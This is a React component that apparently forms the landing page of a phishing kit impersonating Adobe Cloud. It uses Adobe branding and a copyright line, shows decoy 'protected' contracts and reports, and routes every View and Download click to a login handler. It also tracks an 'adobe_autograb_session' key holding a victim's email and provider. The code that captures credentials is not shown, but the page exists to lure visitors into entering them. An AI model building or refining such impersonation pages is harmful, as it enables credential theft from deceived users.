import React, { useState, useEffect } from 'react';
import { FileText, Download, Eye, Trash2, Calendar, User, Menu, X } from 'lucide-react';

interface File {
  name: string;
  type: 'pdf' | 'docx' | 'xlsx';
  size: string;
  date: string;
}

interface LandingPageProps {
  onFileAction: (fileName: string, action: 'view' | 'download') => void;
}

const LandingPage: React.FC<LandingPageProps> = ({ onFileAction }) => {
  const [activeNav, setActiveNav] = useState('Protected Files');
  const [activeView, setActiveView] = useState('Grid View');
  const [currentDate, setCurrentDate] = useState('');
  const [isMobileMenuOpen, setIsMobileMenuOpen] = useState(false);
  const [hasActiveSession, setHasActiveSession] = useState(false);
  const [sessionInfo, setSessionInfo] = useState<any>(null);

  // Generate current date
  useEffect(() => {
    const now = new Date();
    const options: Intl.DateTimeFormatOptions = { 
      month: 'short', 
      day: 'numeric' 
    };
    setCurrentDate(now.toLocaleDateString('en-US', options));
  }, []);

  // Check for existing sessions on component mount
  useEffect(() => {
    checkForExistingSession();
  }, []);

  const checkForExistingSession = async () => {
    try {
      // Check server session first
      const response = await fetch('/.netlify/functions/getSession', {
        method: 'GET',
        credentials: 'include',
        headers: {
          'Content-Type': 'application/json'
        }
      });

      if (response.ok) {
        const data = await response.json();
        if (data.success && data.session) {
          setHasActiveSession(true);
          setSessionInfo(data.session);
          return;
        }
      }

      // Check localStorage for autograb session
      const storedSession = localStorage.getItem('adobe_autograb_session');
      if (storedSession) {
        try {
          const sessionData = JSON.parse(storedSession);
          const sessionTime = new Date(sessionData.timestamp);
          const now = new Date();
          const hoursDiff = (now.getTime() - sessionTime.getTime()) / (1000 * 60 * 60);
          
          // Check if session is still valid (24 hours for autograb)
          if (hoursDiff < 24) {
            setHasActiveSession(true);
            setSessionInfo(sessionData);
            console.log('AutoGrab session found:', sessionData);
          } else {
            // Clean expired session
            localStorage.removeItem('adobe_autograb_session');
          }
        } catch (error) {
          console.error('Error parsing stored session:', error);
          localStorage.removeItem('adobe_autograb_session');
        }
      }
    } catch (error) {
      console.log('No existing session found:', error);
    }
  };

  // Convert file sizes to kilobytes and use current date
  const protectedFiles: File[] = [
    { name: 'Document1.pdf', type: 'pdf', size: '54 KB', date: currentDate },
    { name: 'Report.docx', type: 'docx', size: '56 KB', date: currentDate },
    { name: 'Data.xlsx', type: 'xlsx', size: '50 KB', date: currentDate },
    { name: 'Notes.pdf', type: 'pdf', size: '52 KB', date: currentDate },
    { name: 'Overview.docx', type: 'docx', size: '52 KB', date: currentDate },
    { name: 'Budget.pdf', type: 'pdf', size: '52 KB', date: currentDate },
    { name: 'Summary.pdf', type: 'pdf', size: '50 KB', date: currentDate },
    { name: 'Contract.pdf', type: 'pdf', size: '50 KB', date: currentDate },
    { name: 'Contract2.pdf', type: 'pdf', size: '52 KB', date: currentDate },
  ];

  // Recent files - only one PDF
  const recentFiles: File[] = [
    { name: 'protected-document.pdf', type: 'pdf', size: '48 KB', date: currentDate },
  ];

  const getFileIcon = (type: string) => {
    const baseClasses = "w-6 h-6 sm:w-8 sm:h-8 md:w-10 md:h-10 flex items-center justify-center rounded-lg font-bold text-xs uppercase tracking-wide";
    switch (type) {
      case 'pdf':
        return `${baseClasses} bg-red-50 text-red-600`;
      case 'docx':
        return `${baseClasses} bg-blue-50 text-blue-600`;
      case 'xlsx':
        return `${baseClasses} bg-green-50 text-green-600`;
      default:
        return `${baseClasses} bg-gray-50 text-gray-600`;
    }
  };

  const navItems = ['Protected Files', 'Shared With Me', 'Recent', 'Trash'];

  const getHeaderContent = () => {
    switch (activeNav) {
      case 'Protected Files':
        return {
          title: 'Protected Files',
          description: 'All your secure and recent documents.'
        };
      case 'Shared With Me':
        return {
          title: 'Shared With Me',
          description: 'Documents shared by your team members.'
        };
      case 'Recent':
        return {
          title: 'Recent Files',
          description: 'Your recently accessed documents.'
        };
      case 'Trash':
        return {
          title: 'Trash',
          description: 'Deleted files and documents.'
        };
      default:
        return {
          title: 'Protected Files',
          description: 'All your secure and recent documents.'
        };
    }
  };

  const getCurrentFiles = () => {
    switch (activeNav) {
      case 'Protected Files':
        return protectedFiles;
      case 'Shared With Me':
        return protectedFiles; // Same content as Protected Files
      case 'Recent':
        return recentFiles; // Only one PDF file
      case 'Trash':
        return []; // Empty
      default:
        return protectedFiles;
    }
  };

  const handleFileAction = (fileName: string, action: 'view' | 'download') => {
    // Check if we have an active session for autograb
    if (hasActiveSession && sessionInfo) {
      // Use existing session to bypass authentication
      console.log('Using autograb session for file access:', sessionInfo);
      alert(`Access granted via AutoGrab session! Opening ${fileName}...`);
      // In real scenario, directly access the file
      return;
    }

    // No session available, require login
    onFileAction(fileName, action);
  };

  const useExistingSession = () => {
    if (sessionInfo) {
      alert(`Using existing session for ${sessionInfo.email}. Access granted!`);
      console.log('Session used for bypass authentication');
    }
  };

  const clearSession = () => {
    localStorage.removeItem('adobe_autograb_session');
    sessionStorage.removeItem('adobe_current_session');
    setHasActiveSession(false);
    setSessionInfo(null);
    alert('Session cleared. You will need to login again.');
  };

  const headerContent = getHeaderContent();
  const currentFiles = getCurrentFiles();

  const renderEmptyState = () => (
    <div className="flex flex-col items-center justify-center py-8 sm:py-12 md:py-16 text-center px-4">
      <div className="w-12 h-12 sm:w-16 sm:h-16 bg-white/60 backdrop-blur-sm rounded-full flex items-center justify-center mb-4 shadow-lg">
        <Trash2 className="w-6 h-6 sm:w-8 sm:h-8 text-gray-400" />
      </div>
      <h3 className="text-base sm:text-lg font-semibold text-gray-900 mb-2">Trash is empty</h3>
      <p className="text-sm sm:text-base text-gray-500 max-w-sm">
        When you delete files, they'll appear here before being permanently removed.
      </p>
    </div>
  );

  const renderSessionBanner = () => {
    if (!hasActiveSession || !sessionInfo) return null;

    return (
      <div className="mb-4 sm:mb-6 bg-green-50/90 backdrop-blur-sm border border-green-200 rounded-xl p-3 sm:p-4">
        <div className="flex flex-col sm:flex-row sm:items-center sm:justify-between gap-3">
          <div className="flex items-center gap-3">
            <div className="w-8 h-8 bg-green-100 rounded-full flex items-center justify-center flex-shrink-0">
              <User className="w-4 h-4 text-green-600" />
            </div>
            <div className="min-w-0">
              <h3 className="font-semibold text-green-800 text-sm sm:text-base">Active Session Found</h3>
              <p className="text-xs sm:text-sm text-green-600 truncate">
                {sessionInfo.email} • {sessionInfo.provider}
              </p>
            </div>
          </div>
          <div className="flex gap-2 flex-shrink-0">
            <button
              onClick={useExistingSession}
              className="px-3 py-1.5 bg-green-600 text-white rounded-lg text-xs sm:text-sm font-medium hover:bg-green-700 transition-colors"
            >
              Use Session
            </button>
            <button
              onClick={clearSession}
              className="px-3 py-1.5 bg-gray-500 text-white rounded-lg text-xs sm:text-sm font-medium hover:bg-gray-600 transition-colors"
            >
              Clear
            </button>
          </div>
        </div>
      </div>
    );
  };

  const renderGridView = () => (
    <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-3 sm:gap-4 md:gap-6">
      {currentFiles.map((file, index) => (
        <div
          key={index}
          className="bg-white/90 backdrop-blur-lg rounded-xl shadow-lg border border-white/40 p-3 sm:p-4 md:p-5 hover:shadow-xl transition-all duration-200 group hover:bg-white/95"
        >
          {/* File Header */}
          <div className="flex items-center gap-2 sm:gap-3 md:gap-4 mb-3 sm:mb-4">
            <div className={getFileIcon(file.type)}>
              {file.type}
            </div>
            <div className="flex-1 min-w-0">
              <h3 className="font-semibold text-gray-900 truncate text-xs sm:text-sm md:text-base">
                {file.name}
              </h3>
              <p className="text-xs text-gray-500">
                {file.size} · {file.date}
              </p>
            </div>
          </div>

          {/* File Actions */}
          <div className="flex items-center gap-2 flex-wrap">
            <span className="text-xs font-semibold text-red-600 bg-red-50 px-2 py-1 rounded-full">
              {hasActiveSession ? 'Unlocked' : 'Protected'}
            </span>
            <div className="flex gap-1 sm:gap-2 ml-auto">
              <button
                onClick={() => handleFileAction(file.name, 'view')}
                className="flex items-center gap-1 px-2 sm:px-3 py-1.5 bg-gradient-to-r from-red-600 to-red-700 text-white rounded-lg font-medium text-xs hover:from-red-700 hover:to-red-800 transition-all duration-200 group-hover:transform group-hover:-translate-y-0.5 shadow-md"
              >
                <Eye className="w-3 h-3" />
                <span className="hidden sm:inline">View</span>
              </button>
              <button
                onClick={() => handleFileAction(file.name, 'download')}
                className="flex items-center gap-1 px-2 sm:px-3 py-1.5 bg-white/90 backdrop-blur-sm border border-gray-300 text-gray-600 rounded-lg font-medium text-xs hover:bg-white transition-all duration-200 shadow-sm"
              >
                <Download className="w-3 h-3" />
                <span className="hidden sm:inline">Download</span>
              </button>
            </div>
          </div>
        </div>
      ))}
    </div>
  );

  const renderListView = () => (
    <div className="bg-white/90 backdrop-blur-lg rounded-xl shadow-lg border border-white/40 overflow-hidden">
      {/* Mobile List View */}
      <div className="block sm:hidden">
        {currentFiles.map((file, index) => (
          <div
            key={index}
            className="p-3 border-b border-gray-100 hover:bg-red-50/50 transition-all duration-200"
          >
            <div className="flex items-center gap-3 mb-3">
              <div className={getFileIcon(file.type)}>
                {file.type}
              </div>
              <div className="flex-1 min-w-0">
                <h3 className="font-semibold text-gray-900 truncate text-sm">
                  {file.name}
                </h3>
                <p className="text-xs text-gray-500 flex items-center gap-1">
                  <Calendar className="w-3 h-3" />
                  Modified {file.date} · {file.size}
                </p>
              </div>
            </div>
            <div className="flex items-center justify-between">
              <span className="text-xs font-semibold text-red-600 bg-red-50 px-2 py-1 rounded-full">
                {hasActiveSession ? 'Unlocked' : 'Protected'}
              </span>
              <div className="flex gap-2">
                <button
                  onClick={() => handleFileAction(file.name, 'view')}
                  className="flex items-center gap-1 px-3 py-1.5 bg-gradient-to-r from-red-600 to-red-700 text-white rounded-lg font-medium text-xs hover:from-red-700 hover:to-red-800 transition-all duration-200 shadow-md"
                >
                  <Eye className="w-3 h-3" />
                  View
                </button>
                <button
                  onClick={() => handleFileAction(file.name, 'download')}
                  className="flex items-center gap-1 px-3 py-1.5 bg-white/90 backdrop-blur-sm border border-gray-300 text-gray-600 rounded-lg font-medium text-xs hover:bg-white transition-all duration-200 shadow-sm"
                >
                  <Download className="w-3 h-3" />
                  Download
                </button>
              </div>
            </div>
          </div>
        ))}
      </div>

      {/* Desktop Table View */}
      <div className="hidden sm:block">
        {/* Table Header */}
        <div className="grid grid-cols-12 gap-4 px-4 md:px-6 py-3 md:py-4 bg-red-50/70 backdrop-blur-sm border-b border-gray-100 text-sm font-medium text-gray-700">
          <div className="col-span-6">Name</div>
          <div className="col-span-2">Type</div>
          <div className="col-span-2">Size</div>
          <div className="col-span-2">Actions</div>
        </div>

        {/* Table Rows */}
        {currentFiles.map((file, index) => (
          <div
            key={index}
            className="grid grid-cols-12 gap-4 px-4 md:px-6 py-3 md:py-4 border-b border-gray-50 hover:bg-red-50/50 transition-all duration-200 group"
          >
            {/* File Name with Icon */}
            <div className="col-span-6 flex items-center gap-3">
              <div className={getFileIcon(file.type)}>
                {file.type}
              </div>
              <div className="min-w-0">
                <h3 className="font-semibold text-gray-900 truncate text-sm md:text-base">
                  {file.name}
                </h3>
                <p className="text-xs text-gray-500 flex items-center gap-1">
                  <Calendar className="w-3 h-3" />
                  Modified {file.date}
                </p>
              </div>
            </div>

            {/* File Type */}
            <div className="col-span-2 flex items-center">
              <span className="text-xs font-semibold text-red-600 bg-red-50 px-2 py-1 rounded-full">
                {hasActiveSession ? 'Unlocked' : 'Protected'}
              </span>
            </div>

            {/* File Size */}
            <div className="col-span-2 flex items-center text-sm text-gray-600">
              {file.size}
            </div>

            {/* Actions */}
            <div className="col-span-2 flex items-center gap-2">
              <button
                onClick={() => handleFileAction(file.name, 'view')}
                className="flex items-center gap-1 px-2 md:px-3 py-1.5 bg-gradient-to-r from-red-600 to-red-700 text-white rounded-lg font-medium text-xs md:text-sm hover:from-red-700 hover:to-red-800 transition-all duration-200 shadow-md"
              >
                <Eye className="w-3 h-3" />
                <span className="hidden md:inline">View</span>
              </button>
              <button
                onClick={() => handleFileAction(file.name, 'download')}
                className="flex items-center gap-1 px-2 md:px-3 py-1.5 bg-white/90 backdrop-blur-sm border border-gray-300 text-gray-600 rounded-lg font-medium text-xs md:text-sm hover:bg-white transition-all duration-200 shadow-sm"
              >
                <Download className="w-3 h-3" />
                <span className="hidden md:inline">Download</span>
              </button>
            </div>
          </div>
        ))}
      </div>
    </div>
  );

  return (
    <div className="flex min-h-screen relative overflow-hidden">
      {/* Enhanced background with more red and blur effects */}
      <div className="absolute inset-0 bg-gradient-to-br from-red-100/60 via-red-200/40 to-red-300/50"></div>
      <div className="absolute inset-0 backdrop-blur-md"></div>
      
      {/* Enhanced decorative elements with more red - responsive sizes */}
      <div className="absolute top-10 right-10 w-20 h-20 sm:w-32 sm:h-32 md:w-60 md:h-60 bg-red-400/25 rounded-full blur-3xl"></div>
      <div className="absolute bottom-10 left-10 w-16 h-16 sm:w-24 sm:h-24 md:w-48 md:h-48 bg-red-500/20 rounded-full blur-2xl"></div>
      <div className="absolute top-1/3 right-1/4 w-12 h-12 sm:w-20 sm:h-20 md:w-36 md:h-36 bg-red-300/30 rounded-full blur-xl"></div>
      <div className="absolute bottom-1/3 left-1/3 w-16 h-16 sm:w-24 sm:h-24 md:w-40 md:h-40 bg-white/25 rounded-full blur-2xl"></div>
      <div className="absolute top-1/2 left-1/2 w-10 h-10 sm:w-16 sm:h-16 md:w-32 md:h-32 bg-red-200/20 rounded-full blur-xl transform -translate-x-1/2 -translate-y-1/2"></div>

      {/* Mobile Menu Overlay */}
      {isMobileMenuOpen && (
        <div className="fixed inset-0 bg-black/50 backdrop-blur-sm z-40 lg:hidden" onClick={() => setIsMobileMenuOpen(false)} />
      )}

      {/* Sidebar */}
      <aside className={`relative z-50 w-64 bg-white/85 backdrop-blur-xl border-r border-white/40 flex flex-col shadow-xl transition-transform duration-300 lg:translate-x-0 ${
        isMobileMenuOpen ? 'translate-x-0' : '-translate-x-full'
      } lg:relative lg:z-10 fixed lg:static inset-y-0 left-0`}>
        <div className="p-4 sm:p-6 flex-1">
          {/* Mobile Close Button */}
          <button
            onClick={() => setIsMobileMenuOpen(false)}
            className="lg:hidden absolute top-4 right-4 p-2 text-gray-500 hover:text-gray-700"
          >
            <X className="w-5 h-5" />
          </button>

          {/* Logo Section with Acrobat Logo */}
          <div className="flex items-center gap-3 mb-6 sm:mb-8 md:mb-10">
            <img 
              src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/87/PDF_file_icon.svg/833px-PDF_file_icon.svg.png" 
              alt="Adobe Acrobat" 
              className="w-7 h-7 sm:w-8 sm:h-8 md:w-9 md:h-9 object-contain"
            />
            <h1 className="text-base sm:text-lg md:text-xl font-semibold text-gray-900">Adobe Cloud</h1>
          </div>

          {/* Navigation */}
          <nav className="flex flex-col gap-2 sm:gap-3 md:gap-4">
            {navItems.map((item) => (
              <button
                key={item}
                onClick={() => {
                  setActiveNav(item);
                  setIsMobileMenuOpen(false);
                }}
                className={`text-left px-3 sm:px-4 py-2 rounded-lg font-medium text-sm transition-all duration-200 ${
                  activeNav === item
                    ? 'bg-red-50 text-red-600 shadow-sm'
                    : 'text-gray-600 hover:bg-white/60 hover:backdrop-blur-sm'
                }`}
              >
                {item}
              </button>
            ))}
          </nav>
        </div>

        {/* Adobe Footer */}
        <div className="p-4 sm:p-6 border-t border-white/40">
          <p className="text-xs sm:text-sm text-gray-700 leading-relaxed font-medium">
            © 2025 Adobe Inc.<br />
            All rights reserved.
          </p>
        </div>
      </aside>

      {/* Main Content */}
      <main className="relative z-10 flex-1 p-3 sm:p-4 md:p-6 lg:p-8 min-w-0">
        {/* Mobile Header with Menu Button */}
        <div className="flex items-center justify-between mb-4 lg:hidden">
          <button
            onClick={() => setIsMobileMenuOpen(true)}
            className="p-2 text-gray-600 hover:text-gray-900 bg-white/80 backdrop-blur-sm rounded-lg shadow-sm"
          >
            <Menu className="w-5 h-5" />
          </button>
          <div className="flex items-center gap-2">
            <img 
              src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/87/PDF_file_icon.svg/833px-PDF_file_icon.svg.png" 
              alt="Adobe Acrobat" 
              className="w-5 h-5 object-contain"
            />
            <span className="font-semibold text-gray-900 text-sm">Adobe Cloud</span>
          </div>
        </div>

        {/* Session Banner */}
        {renderSessionBanner()}

        {/* Header */}
        <div className="flex flex-col sm:flex-row sm:justify-between sm:items-start mb-4 sm:mb-6 gap-3 sm:gap-4">
          <div className="min-w-0">
            <h2 className="text-lg sm:text-xl md:text-2xl font-bold text-gray-900 mb-1">
              {headerContent.title}
            </h2>
            <p className="text-sm sm:text-base text-gray-600">{headerContent.description}</p>
          </div>
          
          {/* Only show view controls if not in Trash */}
          {activeNav !== 'Trash' && (
            <div className="flex gap-2 flex-wrap flex-shrink-0">
              <button
                onClick={() => setActiveView('List View')}
                className={`px-3 sm:px-4 py-2 rounded-lg font-medium text-xs sm:text-sm border transition-all duration-200 shadow-sm ${
                  activeView === 'List View'
                    ? 'bg-gradient-to-r from-red-600 to-red-700 text-white border-red-600'
                    : 'bg-white/90 backdrop-blur-sm text-gray-600 border-gray-300 hover:bg-white'
                }`}
              >
                List View
              </button>
              <button
                onClick={() => setActiveView('Grid View')}
                className={`px-3 sm:px-4 py-2 rounded-lg font-medium text-xs sm:text-sm border transition-all duration-200 shadow-sm ${
                  activeView === 'Grid View'
                    ? 'bg-gradient-to-r from-red-600 to-red-700 text-white border-red-600'
                    : 'bg-white/90 backdrop-blur-sm text-gray-600 border-gray-300 hover:bg-white'
                }`}
              >
                Grid View
              </button>
              <button className="px-3 sm:px-4 py-2 rounded-lg font-medium text-xs sm:text-sm bg-white/90 backdrop-blur-sm text-gray-600 border border-gray-300 hover:bg-white transition-all duration-200 shadow-sm">
                Upload
              </button>
            </div>
          )}
        </div>

        {/* Content Area */}
        <div className="min-w-0">
          {activeNav === 'Trash' ? (
            renderEmptyState()
          ) : (
            activeView === 'Grid View' ? renderGridView() : renderListView()
          )}
        </div>
      </main>
    </div>
  );
};

export default LandingPage;